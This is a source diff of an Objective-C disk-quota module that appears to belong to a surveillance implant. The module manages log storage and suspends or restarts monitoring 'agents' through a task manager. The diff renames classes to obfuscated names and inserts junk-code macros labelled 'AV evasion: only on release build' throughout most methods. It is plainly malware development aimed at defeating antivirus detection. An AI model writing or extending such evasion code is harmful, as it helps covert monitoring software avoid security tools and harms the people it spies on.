@@ -5,6 +5,7 @@
 //  Created by kiodo on 16/01/12.
 //  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
 //
+#import "RCSMCommon.h"
 
 #import "RCSMDiskQuota.h"
 #import "RCSMTaskManager.h"
@@ -13,7 +14,9 @@
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
 
-static RCSMDiskQuota *sharedDiskQuota = nil;
+#import "RCSMAVGarbage.h"
+
+static __m_MDiskQuota *sharedDiskQuota = nil;
 
 typedef struct {
   UInt32 disk_quota;
@@ -28,7 +31,7 @@ typedef struct  {
 } global_conf_t;
 
 
-@implementation RCSMDiskQuota
+@implementation __m_MDiskQuota
 
 @synthesize mMaxQuotaTriggered;
 
@@ -46,7 +49,7 @@ typedef struct  {
   return nil;
 }
 
-+ (RCSMDiskQuota *)sharedInstance
++ (__m_MDiskQuota *)sharedInstance
 {
   @synchronized(self)
   {
@@ -89,18 +92,6 @@ typedef struct  {
   return mMaxGlobalQuotaReached;
 }
 
-- (void)incUsed:(UInt32)numBytes
-{
-  @synchronized(self)
-  {
-    mUsed += numBytes;
-  }
-  
-#ifdef DEBUG_QUOTA_
-  infoLog(@"used quota %ld [%ld]", mUsed, numBytes);
-#endif
-}
-
 - (void)decUsed:(UInt32)numBytes
 {
   @synchronized(self)
@@ -114,10 +105,25 @@ typedef struct  {
 #endif
 }
 
+- (void)incUsed:(UInt32)numBytes
+{
+  @synchronized(self)
+  {
+    mUsed += numBytes;
+  }
+  
+#ifdef DEBUG_QUOTA_
+  infoLog(@"used quota %ld [%ld]", mUsed, numBytes);
+#endif
+}
+
 - (void)calcQuotas
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSDictionary *fsAtt = [[NSFileManager defaultManager] attributesOfFileSystemForPath: @"/" error: nil];
   
   mFreeDisk = [[fsAtt objectForKey: NSFileSystemFreeSize] longLongValue];
@@ -126,9 +132,16 @@ typedef struct  {
   NSArray *folderFiles;
   NSString *path;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   folderFiles = [[NSFileManager defaultManager] subpathsAtPath: [[NSBundle mainBundle] bundlePath]];
   
   NSEnumerator *fileEnum = [folderFiles objectEnumerator];
+  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   while ( path = [fileEnum nextObject]) 
   {
@@ -155,10 +168,43 @@ typedef struct  {
   [pool release];
 }
 
+- (void)setEventQuotaParam:(NSDictionary*)confDict
+                 andAction:(NSNumber*)anAction
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
+  if (confDict) 
+  {
+    quota_conf_entry_t *params = (quota_conf_entry_t*)[[confDict objectForKey: @"data"] bytes];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    mMaxLogQuota = params->disk_quota;
+    mStartAction = [anAction copy];
+    mStopAction  = [[NSNumber alloc] initWithInt: params->exit_event];
+    
+#ifdef DEBUG_QUOTA
+    infoLog(@"config: mMaxLogQuota %lu, mStartAction %@, mStopAction %@", 
+            mMaxLogQuota, mStartAction, mStopAction);
+#endif
+  }
+  
+  mMaxQuotaTriggered = FALSE;
+  
+  [pool release];
+}
+
 - (void)resetEventQuotaParam
 {
   mMaxLogQuota = 0; 
   mMaxQuotaTriggered = FALSE;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (mStartAction) 
     {
@@ -172,39 +218,21 @@ typedef struct  {
       mStopAction = nil;
     }
 }
-        
-- (void)setEventQuotaParam:(NSDictionary*)confDict
-                 andAction:(NSNumber*)anAction
-{
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  if (confDict) 
-    {
-      quota_conf_entry_t *params = (quota_conf_entry_t*)[[confDict objectForKey: @"data"] bytes];
-    
-      mMaxLogQuota = params->disk_quota;
-      mStartAction = [anAction copy];
-      mStopAction  = [[NSNumber alloc] initWithInt: params->exit_event];
-      
-#ifdef DEBUG_QUOTA
-    infoLog(@"config: mMaxLogQuota %lu, mStartAction %@, mStopAction %@", 
-    mMaxLogQuota, mStartAction, mStopAction);
-#endif
-    }
-    
-    mMaxQuotaTriggered = FALSE;
-    
-  [pool release];
-}
 
 - (void)setGlobalQuotaParam:(NSData*)confData
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (confData == nil)
     return;
     
   global_conf_t *conf = (global_conf_t*) [confData bytes];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   mMaxGlobalLogSize = conf->max_disk_log;
   mMinGlobalFreeDisk = conf->min_disk_free;
@@ -219,17 +247,18 @@ typedef struct  {
   [pool release];
 }
 
-- (UInt32)used
-{
-  return mUsed;
-}
-
 - (void)checkQuotas
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
   NSNumber *stopAllAgents = [[NSNumber alloc] initWithInt:1];
   NSNumber *startAllAgents = [[NSNumber alloc] initWithInt:0];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   while (TRUE) 
     {
@@ -240,14 +269,20 @@ typedef struct  {
             mUsed, mMaxLogQuota, mMaxGlobalLogSize, mMaxQuotaTriggered);
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // check quotas till logs are flushed
-      if ([[RCSMTaskManager sharedInstance] mIsSyncing])
+      if ([[__m_MTaskManager sharedInstance] mIsSyncing])
           continue;
           
 #ifdef DEBUG_QUOTA
     infoLog(@"checking... %d", (mMaxLogQuota > 0 && mMaxQuotaTriggered == FALSE &&  mUsed > mMaxLogQuota));
 #endif   
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
        // Check and trigger quota events in an out
       if (mMaxLogQuota > 0 && mMaxQuotaTriggered == FALSE &&  (mUsed > mMaxLogQuota))
         {
@@ -258,7 +293,10 @@ typedef struct  {
         }
       
       sleep(1);
-          
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       if (mMaxLogQuota > 0 && mMaxQuotaTriggered == TRUE && (mUsed < mMaxLogQuota))
         {
 #ifdef DEBUG_QUOTA
@@ -272,20 +310,26 @@ typedef struct  {
       mFreeDisk = [[fsAtt objectForKey: NSFileSystemFreeSize] longLongValue];
 
       sleep(1);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       if (mMaxGlobalQuotaReached == FALSE && 
           ((mFreeDisk < mMinGlobalFreeDisk) || (mUsed > mMaxGlobalLogSize)) )
         {
           mMaxGlobalQuotaReached = TRUE;
 
           // Quota disk exceded to taskManager: stop all agents activity
-          [[RCSMTaskManager sharedInstance] suspendAgents];
+          [[__m_MTaskManager sharedInstance] suspendAgents];
           
 #ifdef DEBUG_QUOTA
           infoLog(@"mMaxGlobalQuotaReached exceeded [%lu > %lu]", mUsed, mMaxGlobalLogSize);
 #endif
         }
-       
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       sleep(1);
       
       if (mMaxGlobalQuotaReached == TRUE && 
@@ -294,7 +338,7 @@ typedef struct  {
           mMaxGlobalQuotaReached = FALSE;
           
           // send quota disk now available to taskManager: renable all agents
-          [[RCSMTaskManager sharedInstance] restartAgents];
+          [[__m_MTaskManager sharedInstance] restartAgents];
           
 #ifdef DEBUG_QUOTA
           infoLog(@"mMaxGlobalQuotaReached available [%lu > %lu]", mUsed, mMaxGlobalLogSize);
@@ -302,11 +346,23 @@ typedef struct  {
         }
        
     }
-      
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [stopAllAgents release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [startAllAgents release];
   
   [pool release];
+}
+
+- (UInt32)used
+{
+  return mUsed;
 }
 
 @end
